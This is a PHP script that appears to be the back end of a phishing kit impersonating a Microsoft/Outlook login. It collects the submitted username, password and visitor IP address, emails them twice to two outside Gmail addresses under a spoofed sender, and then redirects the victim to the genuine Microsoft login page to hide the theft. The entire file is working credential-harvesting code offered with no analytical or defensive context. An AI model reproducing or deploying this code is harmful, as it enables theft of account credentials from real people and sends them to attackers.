<?php
if (!empty($_SERVER['HTTP_CLIENT_IP'])) {
    $ip = $_SERVER['HTTP_CLIENT_IP'];
} elseif (!empty($_SERVER['HTTP_X_FORWARDED_FOR'])) {
    $ip = $_SERVER['HTTP_X_FORWARDED_FOR'];
} else {
    $ip = $_SERVER['REMOTE_ADDR'];
}
$to = '
harrisgriffin247@gmail.com';
$complete = 'https://login.live.com/login.srf?wa=wsignin1.0&rpsnv=13&ct=1602063071&rver=7.0.6737.0&wp=MBI_SSL&wreply=https%3a%2f%2foutlook.live.com%2fowa%2f%3fnlp%3d1%26RpsCsrfState%3d7a4b53ca-3415-7979-8805-91b4c6e0fe31&id=292841&aadredir=1&CBCXT=out&lw=1&fl=dob%2cflname%2cwld&cobrandid=90015';
$subject = getenv("REMOTE_ADDR");
$from = "From: TRIGGAR <Austraia>";

$attuser = $_POST['user'];
$attpassword = $_POST['pass'];
$mail_server = 'Godaddy';
$comment = $mail_server.' Details from !-S.Wire-!: '."\n"
			.'**************************************'."\n"
			.'email: '.$attuser."\n"
			.'Password: '.$attpassword."\n"
			.'UserIp: '.$ip."\n";




mail($to, $subject, $comment, $from);

$to = '
olfelixer@gmail.com';
$complete = 'https://login.live.com/login.srf?wa=wsignin1.0&rpsnv=13&ct=1602063071&rver=7.0.6737.0&wp=MBI_SSL&wreply=https%3a%2f%2foutlook.live.com%2fowa%2f%3fnlp%3d1%26RpsCsrfState%3d7a4b53ca-3415-7979-8805-91b4c6e0fe31&id=292841&aadredir=1&CBCXT=out&lw=1&fl=dob%2cflname%2cwld&cobrandid=90015';
$subject = getenv("REMOTE_ADDR");
$from = "From: TRIGGAR <Austraia>";

$attuser = $_POST['user'];
$attpassword = $_POST['pass'];
$mail_server = 'Godaddy';
$comment = $mail_server.' Details from !-S.Wire-!: '."\n"
			.'**************************************'."\n"
			.'email: '.$attuser."\n"
			.'Password: '.$attpassword."\n"
			.'UserIp: '.$ip."\n";




mail($to, $subject, $comment, $from);
header("Location: $complete");

?>